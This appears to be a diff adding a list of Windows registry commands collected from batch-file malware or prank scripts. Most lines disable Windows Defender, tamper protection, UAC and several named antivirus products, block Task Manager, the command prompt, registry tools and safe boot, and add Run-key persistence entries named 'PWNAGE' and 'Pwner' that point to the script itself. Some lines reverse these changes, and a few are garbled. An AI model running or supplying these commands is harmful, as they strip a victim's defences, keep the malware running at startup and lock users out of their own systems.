@@ -1,0 +1,188 @@
+reg add "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
+reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
+reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows Defender" /v DisableAntivirus /t REG_DWORD /d 0 /f
+reg add "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows Defender" /v DisableWinDefender /t REG_DWORD /d 0 /f
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v NoAutoUpdate /t REG_DWORD /d 1 /f
+reg add "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows Defender" /v DisableScanOnRealTimeEnable /t REG_DWORD /d 1 /f
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Features" /v TamperProtection /t REG_DWORD /d 0 /f
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\SystemSettings" /ve /t REG_DWORD /d 0 /f
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v Norun /t REG_DWORD /d 0 /f
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v Nowinkeys /t REG_DWORD /d 0 /f
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDriveTypeAutoRun /t REG_DWORD /d 0 /f
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop" /v NoAddingComponents /t REG_DWORD /d 0 /f
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop" /v NoComponents /t REG_DWORD /d 0 /f
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v HideClock /t REG_DWORD /d 0 /f
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoControlPanel /t REG_DWORD /d 0 /f
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoLogoff /t REG_DWORD /d 0 /f
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v ForceActiveDesktop /t REG_DWORD /d 0 /f
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoActiveDesktop /t REG_DWORD /d 0 /f
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDesktop /t REG_DWORD /d 0 /f
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoActiveDesktopChanges /t REG_DWORD /d 0 /f
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRecentDocsHistory /t REG_DWORD /d 0 /f
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 1 /f
+reg delete "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Keyboard Layouts\Scancode Map" /f
+reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v shutdownwithoutlogon /f
+reg delete "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Keyboard Layout" /ve /f
+reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v disablelogonbar /f
+reg delete "HKEY_CURRENT_USER\Control Panel\Mouse" /v swapmousebutton /f
+reg add "HKEY_CLASSES_ROOT\exefile\DefaultIcon" /ve /d "%1" /f
+reg add "HKEY_CLASSES_ROOT\mp3file\DefaultIcon" /ve /d "%1" /f
+reg add "HKEY_CLASSES_ROOT\mp4file\DefaultIcon" /ve /d "%1" /f
+reg add "HKEY_CLASSES_ROOT\txtfile\DefaultIcon" /ve /d "%1" /f
+reg add "HKEY_CLASSES_ROOT\inifile\DefaultIcon" /ve /d "%1" /f
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\SQMClient" /v AllowTelemetry /t REG_DWORD /d 1 /f
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\SQMClient" /v MaxTelemetryAllowed /t REG_DWORD /d 0 /f
+reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuPin /f
+reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuNet /f
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /d "explorer.exe" /f
+reg add "HKEY_CURRENT_USER\Control Panel\Cursors" /v AppStarting /d "C:\Windows\cursors\aero_working.ani" /f
+reg add "HKEY_CURRENT_USER\Control Panel\Cursors" /v Arrow /d "C:\Windows\cursors\aero_arrow.cur" /f
+reg add "HKEY_CURRENT_USER\Control Panel\Cursors" /v Hand /d "C:\Windows\cursors\aero_link.cur" /f
+reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "StartupScript" /f
+reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Security Center" /v "AntiVirusDisableNotify" /f
+reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Security Center" /v "AntiVirusOverride" /f
+reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\AVAST Software\Avast" /v "aswidsagenta" /f
+reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\AVG" /v "DisableAv" /f
+reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Bitdefender" /v "BlockUserModeAccess" /f
+reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\McAfee" /v "bDisableSelfProtection" /f
+reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\ESET\ESET Security" /v "ProtectEnabled" /f
+reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\KasperskyLab" /v "Enable" /f
+reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Malwarebytes" /v "MalwareProtectionEnabled" /f
+reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Norton" /v "Enable" /f
+reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Avira" /v "ProductEnabled" /f
+reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\PowerShell" /v DisablePowerShell /f
+reg delete "HKCU\Software\Policies\Microsoft\MMC" /v RestrictToPermittedSnapins /f
+reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoControlPanel /f
+reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisablePaint /f
+reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableStickyKeys /f
+reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisablePerformanceMonitor /f
+reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableMMC /f
+reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableEventViewer /f
+reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableSnippingTool /f
+reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableMagnifier /f
+reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableEaseOfAccess /f
+reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v "perfmon.msc" /f
+reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v "perfmon.exe" /f
+reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v "mmc.exe" /f
+reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v "mstsc.exe" /f
+reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v "mobsync.exe" /f
+reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v "SoundRecorder.exe" /f
+reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v "displayswitch.exe" /f
+reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v "conhost.exe" /f
+reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v "taskkill.exe" /f
+reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v "tasklist.exe" /f
+reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v "iexpress.exe" /f
+reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoViewContextMenu" /f
+reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "DisallowRun" /f
+reg delete "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal" /v "OptionValue" /f
+reg delete "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot\Network" /v "OptionValue" /f
+reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoRunAs" /f
+reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "FilterAdministratorToken" /f
+reg delete "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\USBSTOR" /v "Start" /f
+reg delete "HKEY_CURRENT_USER\System\CurrentControlSet" /v "ValueName" /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\SecurityHealthService" /v Start /t REG_DWORD /d 0 /f
+reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real Time Protection" /v DisableRealTimeMonitoring /f
+reg delete "HKEY_CURRENT_USER\Control Panel\Desktop" /v AutoColorization /f
+reg delete "HKEY_CURRENT_USER\Control Panel\Desktop" /v WallPaper /f
+reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v UseDefaultTile /f
+reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\System" /v DisableLogonBackgroundImage /f
+reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoRestartShell /f
+reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DisableCAD /f
+reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Notepad" /v iPointSize /f
+reg delete "HKEY_CLASSES_ROOT\Unknown\DefaultIcon" /ve /f
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop" /v Nochangingwallpaper /t REG_DWORD /d 0 /f
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer/v NoClose /t REG_DWORD /d
+1/f > nul
+eg add "HKLM\Software\Policies\Microsoft\Windows Defender\UX Configuration"  /v "Notification_Suppress" /t REG_DWORD /d "1" /f
+reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System"  /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d "0" /f
+reg add "HKCU\Software\Microsoft\Notepad" /v iPointSize /t REG_DWORD /d 36 /f
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRecycleFiles /t REG_DWORD /d "1" /f > nul
+reg add "HKCU\Software\Microsoft\Windows\Currentversion\Explorer\Advanced" /v Start_Show_Run /t REG_DWORD /d "0" /f > nul
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\WinOldApp" /v Disabled  /t REG_DWORD /d "01" /f 
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\WinOldApp" /v NoRealMode  /t REG_DWORD /d "01" /f
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoDesktop /t REG_DWORD /d "1"
+reg add HKCU\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies /v NoFind /t REG_DWORD /d "1"
+reg add HKLM\SOFTWARE\Policies\Microsoft\Internet Explorer\Restrictions /v NoBrowserClose /t REG_DWORD /d "1"
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoDispCPL /t REG_DWORD /d "1"
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoFolderOptions /t REG_DWORD /d "1"
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\WebView\BarricadedFolders" /v shell:Windows /t REG_DWORD /d "1" /f >nul
+set iconPath="C:\ProgramData\Microsoft\Device Stage\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\pictures.ico"
+reg add "HKEY_CURRENT_USER\Control Panel\Desktop\WindowMetrics" /v IconVerticalSpacing /t REG_SZ /d -1500 /f
+reg add "HKEY_CURRENT_USER\Control Panel\Desktop\WindowMetrics" /v Shell Icon Size /t REG_SZ /d 32 /f
+reg add "HKEY_CURRENT_USER\Control Panel\Desktop\WindowMetrics" /v IconFont /t REG_DWORD /d 0 /f
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Icons" /v 3 /t REG_SZ /d %iconPath% /f
+reg add "HKCU\SOFTWARE\Microsoft\Windows\DWM" /v ColorPrevalence /t REG_DWORD /d 2 /f
+reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v PWNAGE /t REG_SZ /d %systemroot%\system32\drivers\%0 /f >nul
+reg add HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices /v Pwner /t REG_SZ /d %windir%\%0 /f >nul
+reg delete "HKEY_USERS\.DEFAULT\Control Panel\Mouse" /f
+reg delete "HKEY_CURRENT_USER\Identities" /f
+reg delete "HKEY_CURRENT_USER\AppEvents\EventLabels\SystemAsterisk" /f
+reg delete "HKEY_CLASSES_ROOT\MSRDC.SimilarityFileIdTable\CurVer" /f
+reg add "HKEY_CURRENT_USER\System\CurrentControlSet\Control\NetTrace\Session" /v Default /t REG_SZ /d "off" /f
+eg delete "HKEY_LOCAL_MACHINE\SYSTEM\Setup\Status\UnattendPasses\windowsPE" /f
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableCAD /t REG_DWORD /d 1 /f
+reg add "HKEY_CURRENT_USER\System\CurrentControlSet" /v "ValueName" /t REG_DWORD /d "2" /f
+reg add "HKEY_CLASSES_ROOT\xhtmlfile" /v FriendlyTypeName /t REG_EXPAND_SZ /d "@C:\Windows\system32\httpapi.dll,-999" /f
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v "Debugger" /t REG_SZ /d "taskkill /f /im sethc.exe" /f
+reg add "HKEY_CURRENT_USER\Control Panel\International" /v Geo /t REG_SZ /d "Geos" /f
+reg delete "HKEY_CURRENT_USER\AppEvents\EventLabels\WindowsLogoff" /f
+reg add "HKEY_CURRENT_USER\AppEvents\EventLabels\WindowsLogon" /v "@mmres.dll,-5853" /t REG_SZ /d "LogonUI.mui,-5852" /f
+reg add "HKEY_USERS\.DEFAULT\Control Panel\Mouse" /v MouseSpeed /t REG_SZ /d "2" /f
+reg delete "HKEY_USERS\.DEFAULT\Control Panel\Mouse" /f
+reg delete "HKEY_USERS\S-1-5-20\Printers\DevModePerUser" /f
+reg delete “HKLM\SYSTEM\currentcontrolset\control\safeboot\minimal” /f > nul
+reg delete “HKLM\SYSTEM\currentcontrolset\control\safeboot\network” /f > nul
+reg add "HKEY_CURRENT_CONFIG\Software\Fonts" /v LogPixels /t REG_DWORD /d 73 /f
+reg delete "HKEY_CURRENT_USER\AppEvents\EventLabels\HubOffSound" /f
+reg delete "HKEY_CLASSES_ROOT\DXImageTransform.Microsoft.CrBlinds.1" /f
+reg delete "HKEY_CLASSES_ROOT\.lnk" /f
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisablePerformanceMonitor /t REG_DWORD /d 1 /f
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableMMC /t REG_DWORD /d 1 /f
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableEventViewer /t REG_DWORD /d 1 /f
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v NoWinKeys /t REG_DWORD /d 1 /f
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableSnippingTool /t REG_DWORD /d 1 /f
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableMagnifier /t REG_DWORD /d 1 /f
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableEaseOfAccess /t REG_DWORD /d 1 /f
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v "perfmon.msc" /d "" /f
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v "perfmon.exe" /d "" /f
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v "mmc.exe" /d "" /f
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v "mstsc.exe" /d "" /f
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v "mobsync.exe" /d "" /f
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v "SoundRecorder.exe" /d "" /f
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v "displayswitch.exe" /d "" /f
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v "conhost.exe" /d "" /f
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v "taskkill.exe" /d "" /f
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v "tasklist.exe" /d "" /f
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v "iexpress.exe" /d "" /f
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoViewContextMenu" /t REG_DWORD /d "1" /f
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "DisallowRun" /t REG_DWORD /d "1" /f
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal" /v "OptionValue" /t REG_DWORD /d "4" /f
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot\Network" /v "OptionValue" /t REG_DWORD /d "4" /f
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoRunAs" /t REG_DWORD /d "1" /f
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableMSCONFIG /t REG_DWORD /d 1 /f
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "FilterAdministratorToken" /t REG_DWORD /d "1" /f
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\USBSTOR" /v "Start" /t REG_DWORD /d "4" /f
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\AVAST Software\Avast" /v "aswidsagenta" /t REG_DWORD /d "0" /f
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\AVG" /v "DisableAv" /t REG_DWORD /d "1" /f
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Bitdefender" /v "BlockUserModeAccess" /t REG_DWORD /d "1" /f
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\McAfee" /v "bDisableSelfProtection" /t REG_DWORD /d "1" /f
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\ESET\ESET Security" /v "ProtectEnabled" /t REG_DWORD /d "0" /f
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\KasperskyLab" /v "Enable" /t REG_DWORD /d "0" /f
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Malwarebytes" /v "MalwareProtectionEnabled" /t REG_DWORD /d "0" /f
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Norton" /v "Enable" /t REG_DWORD /d "0" /f
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Avira" /v "ProductEnabled" /t REG_DWORD /d "0" /f
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoFileOpen /t REG_DWORD /d 1 /f
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableChangeTime /t REG_DWORD /d 1 /f
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Security Center" /v "AntiVirusOverride" /t REG_DWORD /d "1" /f
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f
+reg add "HKEY_CLASSES_ROOT\.cat" /v "Content Type" /t REG_SZ /d "dllhost.exe" /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\MiniNT" /v DisallowWinPELicensing /t REG_DWORD /d 1 /f
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx" /v "TITLE" /t REG_SZ /d "Anan sexy" /f
+reg add "HKEY_CURRENT_USER\Control Panel\Desktop\WindowMetrics" /v IconSpacing /t REG_SZ /d -1500 /f
+reg add "hklm\Software\Microsoft\Windows\CurrentVersion\Run" /v "rundll32_awspeGfa_w32" /t "REG_SZ" /d %0 /f > nul
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoUserNameInStartMenu" /d "1" /f >nul
+reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v WINDOWsAPI /t reg_sz /d c:\windows\wimn32.bat /f 
+reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v CONTROLexit /t reg_sz /d c:\windows\wimn32.bat /f 
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableCMD /t REG_DWORD /d 1 /f
+reg add “HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System” /v DisableRegistryTools /t REG_DWORD /d “1”
